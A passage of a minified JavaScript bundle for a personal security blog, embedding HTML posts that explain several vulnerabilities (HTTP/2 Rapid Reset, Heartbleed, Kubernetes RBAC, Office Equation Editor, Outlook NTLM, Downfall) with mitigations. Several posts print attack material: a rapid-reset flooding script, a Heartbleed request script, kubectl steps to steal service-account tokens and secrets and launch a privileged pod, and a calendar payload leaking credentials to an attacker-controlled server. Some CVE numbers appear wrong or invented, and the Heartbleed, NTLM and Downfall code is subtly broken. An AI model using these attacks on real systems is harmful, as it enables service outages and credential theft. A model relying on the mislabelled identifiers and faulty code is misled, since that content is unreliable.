av(){const[e,n]=S.useState(al),[t,s]=S.useState(1),r=5,i=Math.max(1,Math.ceil(e.length/r)),a=e.slice((t-1)*r,t*r),l=o=>{n(o),s(1)};return d.jsx("div",{className:"hud-workspace",children:d.jsxs(Mt,{title:"Blog Feed",subtitle:"drag / resize",initialSize:{width:1180},children:[d.jsx(sv,{data:tv}),d.jsx("div",{className:"container blog-controls",children:d.jsx(iv,{posts:al,onFilter:l})}),d.jsx(rv,{posts:a,page:t,totalPages:i,onPageChange:s})]})})}const lv=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>CVE-2024–0012: HTTP/2 Rapid Reset Attack Explained</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">CVE-2024–0012: HTTP/2 Rapid Reset Attack Explained</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What is CVE-2024–0012?</h2>
        <p>
          CVE-2024–0012, known as the HTTP/2 Rapid Reset Attack, was disclosed, affecting major web servers like Apache and Nginx. This denial-of-service (DoS) vulnerability exploits HTTP/2’s stream management system by abusing the RST_STREAM frame. By overwhelming the server with rapid stream resets, attackers can exhaust resources and disrupt services.
        </p>

        <h2>How the Vulnerability Works</h2>
        <h3>HTTP/2 and RST_STREAM</h3>
        <p>
          HTTP/2 allows multiplexing multiple streams over a single connection. The RST_STREAM frame cancels streams when they are no longer needed. However, attackers can send a rapid series of RST_STREAM frames, forcing the server to process and discard streams at an unsustainable rate, leading to resource exhaustion.
        </p>

        <h2>Exploit Code Example</h2>
        <p>
          Below is an educational example in Python that demonstrates how an attacker could exploit this vulnerability using an HTTP/2 library.
        </p>
        <div class="code-block">
          <code>
import h2.connection<br>
import h2.events<br>
import socket<br>
import ssl<br>
import time<br><br>

# Configure target server<br>
TARGET_HOST = "vulnerable-server.com"<br>
TARGET_PORT = 443<br>
STREAM_COUNT = 1000  # Number of streams to abuse<br><br>

def send_reset_attack():<br>
    # Establish SSL/TLS connection<br>
    context = ssl.create_default_context()<br>
    with socket.create_connection((TARGET_HOST, TARGET_PORT)) as raw_sock:<br>
        with context.wrap_socket(raw_sock, server_hostname=TARGET_HOST) as tls_sock:<br>
            # Initialize HTTP/2 connection<br>
            conn = h2.connection.H2Connection()<br>
            conn.initiate_connection()<br>
            tls_sock.sendall(conn.data_to_send())<br><br>

            # Send multiple streams with rapid resets<br>
            for stream_id in range(1, STREAM_COUNT * 2, 2):  # HTTP/2 streams are odd-numbered<br>
                conn.send_headers(<br>
                    stream_id=stream_id,<br>
                    headers=[<br>
                        (":method", "GET"),<br>
                        (":path", "/"),<br>
                        (":authority", TARGET_HOST),<br>
                        (":scheme", "https"),<br>
                    ],<br>
                )<br>
                tls_sock.sendall(conn.data_to_send())<br>
                conn.reset_stream(stream_id)<br>
                tls_sock.sendall(conn.data_to_send())<br>
                print(f"Stream {stream_id} reset sent")<br>
            time.sleep(5)<br><br>

if __name__ == "__main__":<br>
    print(f"Launching HTTP/2 Rapid Reset Attack on {TARGET_HOST}...")<br>
    send_reset_attack()<br>
    print("Attack complete. Check server performance.")<br>
          </code>
        </div>
        <p><strong>Disclaimer:</strong> This code is for educational purposes only. Testing such exploits without proper authorization is unethical and illegal.</p>

        <h2>Mitigation Strategies</h2>
        <ol>
          <li><strong>Apply Server Patches:</strong> Server vendors like Apache and Nginx have released patches to mitigate this vulnerability. Update your software to the latest version.</li>
          <li><strong>Implement Rate-Limiting:</strong> Use rate-limiting to restrict the number of HTTP/2 streams and resets per connection.</li>
          <li><strong>Monitor Server Metrics:</strong> Deploy monitoring tools to detect unusual spikes in resource usage associated with HTTP/2 traffic.</li>
          <li><strong>Disable HTTP/2 Temporarily:</strong> If patching is not feasible, disable HTTP/2 support as a temporary mitigation:
            <ul>
              <li><strong>For Apache:</strong> Remove <code>h2</code> from the <code>Protocols</code> directive:</li>
              <code>Protocols h2 h2c http/1.1</code>
              <li><strong>For Nginx:</strong> Remove the <code>http2</code> directive from server configurations.</li>
            </ul>
          </li>
        </ol>

        <h2>Conclusion</h2>
        <p>
          CVE-2024–0012, or the HTTP/2 Rapid Reset Attack, underscores the importance of securing web servers against denial-of-service attacks. By applying timely patches, implementing rate-limiting, and monitoring server activity, organizations can mitigate this threat and ensure the availability of their services.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,ov=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Heartbleed (CVE-2014–0160)</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">Heartbleed (CVE-2014–0160)</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>Understanding Heartbleed: A Technical Breakdown</h2>
        <p>
          Heartbleed was a flaw in the heartbeat extension of OpenSSL, a widely used library that provides SSL/TLS encryption. The vulnerability was introduced in OpenSSL version 1.0.1 and persisted until version 1.0.1g. The issue stemmed from improper input validation, allowing an attacker to read arbitrary chunks of server memory, up to 64KB per request.
        </p>

        <h3>Heartbeat Extension Basics</h3>
        <p>
          To maintain secure connections, OpenSSL’s heartbeat mechanism allows clients and servers to verify each other’s presence by sending and receiving “heartbeat” messages. Here’s how the message exchange is supposed to work:
        </p>
        <ol>
          <li>A client sends a heartbeat request containing a payload and specifies the payload length.</li>
          <li>The server echoes the payload back to the client to confirm the connection is still alive.</li>
        </ol>
        <p>
          The vulnerability occurs because the server trusts the client-supplied payload length without verifying it against the actual payload size, leading to memory leaks.
        </p>

        <h3>Simplified Vulnerable Code</h3>
        <div class="code-block">
          <code>
int tls1_process_heartbeat(SSL *s) {<br />
&nbsp;&nbsp;unsigned char *p = &s->s3->rrec.data[0];<br />
&nbsp;&nbsp;unsigned short payload;<br />
&nbsp;&nbsp;unsigned char *buffer, *bp;<br />
&nbsp;&nbsp;payload = (p[0] << 8) | p[1];<br />
&nbsp;&nbsp;buffer = OPENSSL_malloc(1 + 2 + payload + 16);<br />
&nbsp;&nbsp;bp = buffer;<br />
&nbsp;&nbsp;*bp++ = TLS1_HB_RESPONSE;<br />
&nbsp;&nbsp;memcpy(bp, p, payload); // Vulnerable<br />
&nbsp;&nbsp;ssl3_write_bytes(s, TLS1_RT_HEARTBEAT, buffer, 3 + payload);<br />
&nbsp;&nbsp;OPENSSL_free(buffer);<br />
}
          </code>
        </div>

        <h2>How Heartbleed Works</h2>
        <p>
          An attacker can exploit this vulnerability by sending a malicious heartbeat request where the payload length is intentionally larger than the actual payload.
        </p>

        <h3>Exploit Example in Python</h3>
        <div class="code-block">
          <code>
import socket<br />
import struct<br />
def create_heartbeat_request():<br />
&nbsp;&nbsp;hb_type = 1<br />
&nbsp;&nbsp;payload = b"Hi"<br />
&nbsp;&nbsp;payload_length = 0xFFFF<br />
&nbsp;&nbsp;return struct.pack(">BHH", hb_type, len(payload), payload_length) + payload<br />
def send_heartbeat_request(host, port):<br />
&nbsp;&nbsp;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br />
&nbsp;&nbsp;s.connect((host, port))<br />
&nbsp;&nbsp;s.send(create_heartbeat_request())<br />
&nbsp;&nbsp;response = s.recv(65535)<br />
&nbsp;&nbsp;print("Leaked memory:", response)<br />
send_heartbeat_request("example.com", 443)
          </code>
        </div>

        <h2>Global Chaos and Real-World Impact</h2>
        <p>
          The Heartbleed vulnerability affected a significant portion of the internet, with estimates suggesting that 17% of all secure web servers were compromised. Major companies were forced to take immediate action to patch their systems.
        </p>

        <h2>Detecting Heartbleed</h2>
        <p>
          Security tools like Nmap can be used to detect Heartbleed vulnerabilities. Use the following command:
        </p>
        <div class="code-block">
          <code>
nmap -p 443 --script ssl-heartbleed example.com
          </code>
        </div>

        <h2>Lessons Learned</h2>
        <ul>
          <li><strong>Input Validation:</strong> Validate all inputs, especially lengths and buffer sizes.</li>
          <li><strong>Automated Patching Systems:</strong> Ensure systems are regularly updated.</li>
          <li><strong>Memory Safety Practices:</strong> Use memory-safe programming languages like Rust.</li>
        </ul>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,cv=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>CVE-2024–1001: Kubernetes RBAC Misconfiguration</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">CVE-2024–1001: Kubernetes RBAC Misconfiguration</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What is CVE-2024–1001?</h2>
        <p>
          Kubernetes relies heavily on Role-Based Access Control (RBAC) to manage permissions. However, in early 2024, CVE-2024–1001 was disclosed, revealing how misconfigured RBAC rules in Kubernetes could allow attackers to gain full control over a cluster. This vulnerability emphasizes the risks of poorly defined access policies.
        </p>

        <h3>RBAC in Kubernetes</h3>
        <p>
          RBAC allows administrators to define who can access resources in a Kubernetes cluster and what actions they can perform. Permissions are granted using Roles, Cluster Roles, and Role Bindings.
        </p>

        <h2>The Vulnerability</h2>
        <p>
          CVE-2024–1001 occurs when overly permissive RBAC configurations allow attackers to escalate privileges. Specifically:
        </p>
        <ul>
          <li>Permissions like “create” or “patch” on sensitive resources (e.g., Pods) can be abused.</li>
          <li>Attackers can deploy malicious workloads, extract secrets, or control the cluster API server.</li>
        </ul>

        <h2>Exploit Workflow</h2>
        <h3>RBAC Misconfiguration</h3>
        <div class="code-block">
          <code>
apiVersion: rbac.authorization.k8s.io/v1<br>
kind: Role<br>
metadata:<br>
&nbsp;&nbsp;namespace: vulnerable-namespace<br>
&nbsp;&nbsp;name: overly-permissive-role<br>
rules:<br>
- apiGroups: [""]<br>
&nbsp;&nbsp;resources: ["pods", "secrets"]<br>
&nbsp;&nbsp;verbs: ["get", "create", "patch"]<br>
          </code>
        </div>
        <p>This Role allows anyone bound to it to create and patch Pods and access secrets in the namespace.</p>

        <h3>Step-by-Step Exploit</h3>
        <ol>
          <li><strong>Gain Initial Access:</strong> Assume the attacker has access to a low-privileged service account in the namespace, bound to the misconfigured Role.</li>
          <li><strong>Create a Malicious Pod:</strong> Use the <code>kubectl</code> command to create a Pod with elevated privileges:
            <div class="code-block">
              <code>
kubectl run malicious-pod --image=alpine --restart=Never -- /bin/sh -c "apk add curl; while true; do sleep 3600; done"
              </code>
            </div>
          </li>
          <li><strong>Access Sensitive Secrets:</strong> Once the Pod is running, exec into it:
            <div class="code-block">
              <code>
kubectl exec -it malicious-pod -- /bin/sh<br>
# Inside the Pod:<br>
curl -s -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \\ <br>
https://kubernetes.default.svc/api/v1/namespaces/vulnerable-namespace/secrets
              </code>
            </div>
          </li>
          <li><strong>Escalate Privileges:</strong> Create Pods with privileged containers:
            <div class="code-block">
              <code>
kubectl apply -f - <<EOF<br>
apiVersion: v1<br>
kind: Pod<br>
metadata:<br>
&nbsp;&nbsp;name: root-access-pod<br>
&nbsp;&nbsp;namespace: kube-system<br>
spec:<br>
&nbsp;&nbsp;containers:<br>
&nbsp;&nbsp;- name: root-access-container<br>
&nbsp;&nbsp;&nbsp;&nbsp;image: alpine<br>
&nbsp;&nbsp;&nbsp;&nbsp;securityContext:<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;privileged: true<br>
&nbsp;&nbsp;&nbsp;&nbsp;command: ["/bin/sh", "-c", "while true; do sleep 3600; done"]<br>
EOF
              </code>
            </div>
          </li>
        </ol>

        <h2>Mitigation Strategies</h2>
        <ol>
          <li><strong>Enforce the Principle of Least Privilege:</strong> Grant only the minimum permissions necessary for users and service accounts to perform their tasks. Avoid broad permissions like “create” or “patch” on sensitive resources.</li>
          <li><strong>Audit RBAC Policies:</strong> Regularly audit your RBAC configurations to identify overly permissive Roles and ClusterRoles:
            <div class="code-block">
              <code>
kubectl get roles,clusterroles,rolebindings,clusterrolebindings --all-namespaces
              </code>
            </div>
          </li>
          <li><strong>Use Pod Security Standards:</strong> Apply Pod Security Standards (PSS) to restrict privileged Pod creation:
            <div class="code-block">
              <code>
apiVersion: policy/v1beta1<br>
kind: PodSecurityPolicy<br>
metadata:<br>
&nbsp;&nbsp;name: restricted<br>
spec:<br>
&nbsp;&nbsp;privileged: false
              </code>
            </div>
          </li>
          <li><strong>Enable Logging and Monitoring:</strong> Monitor for suspicious activities, such as unauthorized Pod creation or access to secrets. Tools like Falco or Kubernetes Audit Logs can help.</li>
          <li><strong>Use Network Policies:</strong> Restrict Pod-to-Pod communication using Kubernetes Network Policies to limit the attack surface.</li>
        </ol>

        <h2>Conclusion</h2>
        <p>
          CVE-2024–1001 underscores the importance of careful RBAC configuration in Kubernetes. Misconfigured permissions can open the door to attackers, allowing them to escalate privileges and take over a cluster. By enforcing least privilege, auditing RBAC policies, and using Pod Security Standards, organizations can safeguard their Kubernetes environments.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,uv=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>CVE-2017–11882: Microsoft Office Memory Corruption Vulnerability</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">CVE-2017–11882: Microsoft Office Memory Corruption Vulnerability</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What is CVE-2017–11882?</h2>
        <p>
          CVE-2017–11882 is a critical vulnerability within Microsoft Office’s Equation Editor component. This legacy feature, designed for displaying mathematical equations, contains a memory corruption flaw that lets attackers execute malicious code when users open a specially crafted document. Attackers can exploit this weakness to install malware, steal data, or gain full control over a target system with the same permissions as the user.
        </p>

        <h3>Affected Office Versions:</h3>
        <ul>
          <li>Microsoft Office 2007 (Service Pack 3)</li>
          <li>Microsoft Office 2010 (Service Pack 2)</li>
          <li>Microsoft Office 2013 (Service Pack 1)</li>
          <li>Microsoft Office 2016</li>
        </ul>
        <p>
          Despite being patched in November 2017, the Equation Editor vulnerability remains a key target, with unpatched systems or older Office versions still vulnerable.
        </p>

        <h2>How the Vulnerability Works</h2>
        <p>
          This vulnerability allows remote code execution (RCE) by corrupting memory through Office’s Object Linking and Embedding (OLE) feature when opening a malicious document. Here’s how an attack typically unfolds:
        </p>
        <ol>
          <li><strong>Phishing:</strong> The attacker sends an email with an attachment, like a Word or Excel document, designed to exploit CVE-2017–11882.</li>
          <li><strong>User Action:</strong> The user opens the document, unknowingly triggering malicious code within the Equation Editor.</li>
          <li><strong>System Compromise:</strong> The attacker gains control over the system, potentially installing further malware, stealing sensitive data, or using the compromised system to attack other network resources.</li>
        </ol>

        <h2>Why CVE-2017–11882 Remains a Top Target</h2>
        <p>
          This vulnerability is highly favored by cybercriminals and nation-state hackers from countries like China, Russia, and North Korea. Both the Department of Homeland Security and the FBI have flagged it as a frequently exploited vulnerability. Its persistence can be attributed to:
        </p>
        <ul>
          <li><strong>Ease of Exploitation:</strong> Attackers only need to convince users to open a document, making social engineering attacks highly effective.</li>
          <li><strong>Legacy Code:</strong> The Equation Editor, dating back to 2000, is incompatible with modern Office security features, making it difficult to defend without patching.</li>
          <li><strong>Prevalence of Unpatched Systems:</strong> Many organizations, particularly those with older Office versions, haven’t applied Microsoft’s 2017 patch, leaving them vulnerable.</li>
        </ul>

        <h2>How to Protect Against CVE-2017–11882</h2>
        <p>
          With patches readily available, mitigating CVE-2017–11882 is straightforward, yet it requires proactive security practices. Here’s how organizations can protect themselves:
        </p>
        <ol>
          <li><strong>Update Microsoft Office:</strong> Ensure all Office versions are up-to-date with Microsoft’s security patches. Microsoft’s November 2017 patch addresses CVE-2017–11882 and should be applied immediately to unpatched systems.</li>
          <li><strong>Disable the Equation Editor:</strong> If this feature is unnecessary for your organization, disable it. Doing so removes a significant attack vector.</li>
          <li><strong>Use Modern Endpoint Protection:</strong> Employ advanced endpoint security tools that can detect and block malicious document activity. Many modern security solutions offer protections specifically designed to detect CVE-2017–11882 exploitation.</li>
          <li><strong>User Awareness and Training:</strong> Social engineering plays a significant role in the success of attacks exploiting this vulnerability. Educate users on the risks of opening unknown attachments or clicking links in unsolicited emails.</li>
        </ol>

        <h2>Staying Ahead of Persistent Threats</h2>
        <p>
          The continued exploitation of CVE-2017–11882 underscores the importance of regular patching, user education, and layered security defenses. A vulnerability like this, embedded in software many organizations rely on daily, is a stark reminder that cybersecurity requires constant vigilance.
        </p>
        <p>
          By applying patches, disabling unused features, and maintaining a robust security posture, organizations can effectively protect themselves against even the oldest and most persistent threats in today’s digital landscape. In cybersecurity, diligence, and preparedness are the best defenses against exploitation — whether it’s a vulnerability from yesterday or one that emerges tomorrow.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,pv=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>CVE-2023–23397: Microsoft Outlook NTLM Credential Theft</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">CVE-2023–23397: Microsoft Outlook NTLM Credential Theft</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>How CVE-2023–23397 Works</h2>
        <p>
          The vulnerability exploits how Microsoft Outlook handles reminders and calendar invites. Normally, Outlook processes these items to display notifications and updates. However, in this case, attackers can create a specially crafted message that tricks Outlook into making an outbound connection to a server under the attacker’s control. This connection is made using NTLM authentication, sending the victim’s NTLM credentials and exposing them to potential misuse.
        </p>

        <h3>Exploit Scenario</h3>
        <ol>
          <li>An attacker crafts a malicious email containing a reminder or calendar invite.</li>
          <li>The email specifies a UNC (Universal Naming Convention) path that points to an attacker-controlled server.</li>
          <li>When Outlook receives and processes this email, it automatically tries to access the specified UNC path, triggering NTLM authentication and sending the victim’s credentials to the attacker.</li>
        </ol>

        <h3>Code and Example</h3>
        <div class="code-block">
          <code>
import http.server<br>
import socketserver<br><br>
class MyRequestHandler(http.server.SimpleHTTPRequestHandler):<br>
&nbsp;&nbsp;&nbsp;&nbsp;def do_GET(self):<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(f"Received connection from: {self.client_address}")<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.send_response(200)<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.end_headers()<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.wfile.write(b"Hello, you've been logged!")<br><br>
PORT = 8000<br>
handler = MyRequestHandler<br>
with socketserver.TCPServer(("", PORT), handler) as httpd:<br>
&nbsp;&nbsp;&nbsp;&nbsp;print(f"Serving on port {PORT}")<br>
&nbsp;&nbsp;&nbsp;&nbsp;httpd.serve_forever()<br>
          </code>
        </div>

        <h3>Malicious Email Payload Example</h3>
        <div class="code-block">
          <code>
BEGIN:VCALENDAR<br>
VERSION:2.0<br>
BEGIN:VEVENT<br>
UID:123456<br>
SUMMARY:Malicious Reminder<br>
DTSTART;TZID=Europe/London:20231105T090000<br>
ATTACH;VALUE=URI:\\\\attacker-controlled-server.com\\malicious\\path<br>
END:VEVENT<br>
END:VCALENDAR<br>
          </code>
        </div>

        <h2>Impact and Risks</h2>
        <ul>
          <li><strong>Credential Theft:</strong> If an attacker successfully captures NTLM credentials, they can use them to authenticate against other systems on the same network, potentially gaining unauthorized access.</li>
          <li><strong>No User Interaction Needed:</strong> The lack of user interaction makes this vulnerability particularly dangerous, as even vigilant users can fall victim without realizing it.</li>
          <li><strong>Enterprise Threat:</strong> Organizations with a large number of Outlook users are especially at risk, as the exploit can be used to pivot through corporate networks.</li>
        </ul>

        <h2>Mitigation Strategies</h2>
        <ol>
          <li><strong>Update Microsoft Outlook:</strong> Microsoft has released patches for this vulnerability. Ensure that all systems are updated to the latest version of Outlook.</li>
          <li><strong>Disable SMB Outbound Traffic:</strong> Blocking outbound SMB traffic at the network perimeter can prevent credentials from being sent to an external server.</li>
          <li><strong>Use Protected Users Group:</strong> Members of this group in Active Directory are protected against NTLM authentication.</li>
          <li><strong>Implement NTLM Blocking Policies:</strong> Where possible, configure policies to restrict NTLM authentication and enforce Kerberos.</li>
        </ol>

        <h3>Defensive Example in PowerShell</h3>
        <div class="code-block">
          <code>
Set-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0" -Name "RestrictSendingNTLMTraffic" -Value "2"
          </code>
        </div>
        <p>
          This command enforces NTLM restrictions, significantly reducing the risk of credential theft.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,dv=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Downfall (CVE-2022–40982): Exploiting Speculative Execution in Intel CPUs</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">Downfall (CVE-2022–40982): Exploiting Speculative Execution in Intel CPUs</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What is Downfall (CVE-2022–40982)?</h2>
        <p>
          In August 2023, a critical vulnerability, CVE-2022–40982, dubbed Downfall, was disclosed. This vulnerability affects Intel x86–64 processors and exploits speculative execution to access sensitive data stored in vector registers. It impacts both consumer CPUs and server-grade Xeon processors, allowing attackers with local access to bypass security boundaries and potentially extract confidential information like encryption keys or passwords.
        </p>

        <h2>Speculative Execution</h2>
        <p>
          Modern CPUs optimize performance by predicting and executing instructions ahead of time through speculative execution. However, speculative execution does not adhere to standard security checks during execution, which creates opportunities for attackers to access restricted data.
        </p>

        <h2>Downfall’s Mechanism</h2>
        <p>
          Downfall specifically exploits speculative execution in Advanced Vector Extensions (AVX). It leverages a use-after-free vulnerability during the speculative execution of AVX instructions to access sensitive data stored in vector registers.
        </p>

        <h2>Conceptual Exploit Example</h2>
        <p>
          Below is a conceptual C pseudocode to demonstrate how speculative execution attacks like Downfall work. This example is strictly for educational purposes only to understand the mechanics of such vulnerabilities.
        </p>
        <div class="code-block">
          <code>
#include &lt;stdio.h&gt;<br>
#include &lt;immintrin.h&gt;  // For AVX instructions<br>
#include &lt;stdint.h&gt;<br><br>

// Step 1: Setup memory and registers<br>
void setup_sensitive_data() {<br>
    volatile char secret[] = "SensitiveData"; // Simulated sensitive data<br>
    __m256i vector_data = _mm256_loadu_si256((__m256i *)secret); // Load data into vector register<br>
}<br><br>

// Step 2: Induce speculative execution<br>
void trigger_speculative_execution(char *probe_array) {<br>
    volatile uint64_t timing;<br>
    int speculative_index = 1024; // An index beyond bounds for speculative execution<br>
    char leaked_value;<br><br>

    // Access array in a way to induce speculative execution<br>
    if (speculative_index &lt; 512) {  // This branch is speculatively executed<br>
        leaked_value = probe_array[speculative_index];<br>
    }<br><br>

    // Measure timing to infer accessed value (side-channel analysis)<br>
    for (int i = 0; i &lt; 256; i++) {<br>
        timing = measure_timing(&amp;probe_array[i * 64]); // Simulated timing measurement<br>
        if (timing &lt; THRESHOLD) {<br>
            printf("Leaked value: %c\\n", i); // Print inferred value<br>
        }<br>
    }<br>
}<br><br>

// Step 3: Measure cache timing (side-channel)<br>
uint64_t measure_timing(void *addr) {<br>
    uint64_t start, end;<br>
    asm volatile (<br>
        "mfence\\n"<br>
        "lfence\\n"<br>
        "rdtsc\\n"      // Read time-stamp counter<br>
        "mov %%rax, %0\\n"<br>
        "mov (%1), %%r8\\n" // Access memory<br>
        "rdtscp\\n"<br>
        "mov %%rax, %1\\n"<br>
        "mfence\\n"<br>
        : "=r"(start), "=r"(end)<br>
        : "r"(addr)<br>
        : "rax", "rbx", "rcx", "r8"<br>
    );<br>
    return end - start;<br>
}<br><br>

// Main Function<br>
int main() {<br>
    char probe_array[256 * 64]; // Array for side-channel timing analysis<br><br>

    setup_sensitive_data();<br>
    trigger_speculative_execution(probe_array);<br><br>

    return 0;<br>
}
          </code>
        </div>

        <h2>Mitigation Strategies</h2>
        <ol>
